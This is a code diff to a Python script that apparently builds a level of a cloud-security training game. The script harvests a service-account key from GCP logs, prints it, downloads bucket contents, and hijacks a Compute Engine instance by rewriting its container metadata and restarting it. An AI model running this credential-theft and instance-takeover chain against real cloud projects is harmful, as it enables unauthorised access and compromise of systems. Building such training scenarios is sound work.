@@ -89,7 +89,9 @@ def create(second_deploy=True):
     data = {'name':'Robert Caldwell', 'authentication':dev_key}
     resp = req(url, method = 'POST', body = data, headers = headers)
 
+    time.sleep(15)
     exploit(nonce, logging_key)
+    time.sleep(15)
     hack()
 
     print(f'Level creation complete for: {LEVEL_PATH}')
@@ -163,9 +165,11 @@ def exploit(nonce, logging_key):
     logging_client = glogging.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(logging_key)))
     logger = logging_client.logger('rmUser')
     logs = logger.list_entries()
+    # TODO fix sleep could crash if log is delayed
     dev_key = list(logs)[-1].payload['auth']
+    print(dev_key)
     storage_client = storage.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(dev_key)))
-    blobs = storage_client.list_blobs(f'vm-image-bucket-{nonce}')
+    blobs = list(storage_client.list_blobs(f'vm-image-bucket-{nonce}'))
     temp_dir = 'test/' ###TODO change me
     os.mkdir(temp_dir)
     for blob in blobs:
@@ -195,7 +199,11 @@ def exploit(nonce, logging_key):
     payload = {'fingerprint': fingerprint, 'items': [{'key': 'gce-container-declaration', 'value': new_gce}]}
     compute_api.instances().setMetadata(project='atomic-hash-305702', zone='us-west1-b', instance='api-engine', body=payload).execute()
     compute_api.instances().stop(project='atomic-hash-305702', zone='us-west1-b', instance='api-engine').execute()
+    while(compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()['status'] != 'TERMINATED'):
+        time.sleep(2)
     compute_api.instances().start(project='atomic-hash-305702', zone='us-west1-b', instance='api-engine').execute()
+    while(compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()['status'] != 'RUNNING'):
+        time.sleep(2)
     shutil.rmtree(temp_dir)
 
 def hack():
